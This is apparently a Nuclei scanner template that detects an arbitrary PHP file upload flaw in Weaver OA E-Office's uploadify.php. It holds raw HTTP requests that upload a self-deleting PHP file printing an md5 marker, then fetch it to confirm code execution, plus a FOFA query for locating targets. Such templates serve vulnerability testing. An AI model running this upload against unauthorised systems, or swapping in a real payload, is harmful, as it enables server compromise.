http:
- matchers:
  - condition: and
    dsl:
    - contains(body_2, 'imageSrc') && contains(body_2, 'height')
    type: dsl
  - part: body_3
    type: word
    words:
    - '{{md5(string)}}'
  matchers-condition: and
  raw:
  - 'GET /general/weibo/javascript/uploadify/uploadify.php HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /general/weibo/javascript/uploadify/uploadify.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like
    Gecko) Chrome/71.0.3578.98 Safari/537.36

    Accept: */*

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjetvpuye

    Accept-Encoding: gzip


    ------WebKitFormBoundaryjetvpuye

    Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.php"

    Content-Type: application/octet-stream


    <?php echo md5("{{string}}");unlink(__FILE__);?>

    ------WebKitFormBoundaryjetvpuye--

    '
  - 'GET /attachment/personal/_temp.php HTTP/1.1

    Host: {{Hostname}}

    '
id: weaver-uploadify-file-upload
info:
  author: SleepingBag945
  classification:
    cpe: cpe:2.3:a:weaver:e-office:*:*:*:*:*:*:*:*
  description: OA E-Office Uploadify is vulnerable to arbitrary file upload.
  metadata:
    fofa-query: "app=\"\u6CDB\u5FAE-EOffice\""
    max-request: 3
    product: e-office
    vendor: weaver
    verified: true
  name: OA E-Office Uploadify - Arbitrary File Upload
  reference:
  - https://github.com/w-digital-scanner/w9scan/blob/master/plugins/weaver_oa/2158.py
  severity: critical
  tags: weaver,e-office,oa,intrusive,rce,fileupload,vuln
variables:
  filename: '{{to_lower(rand_base(5))}}'
  string: weaver-uploadify-file-upload
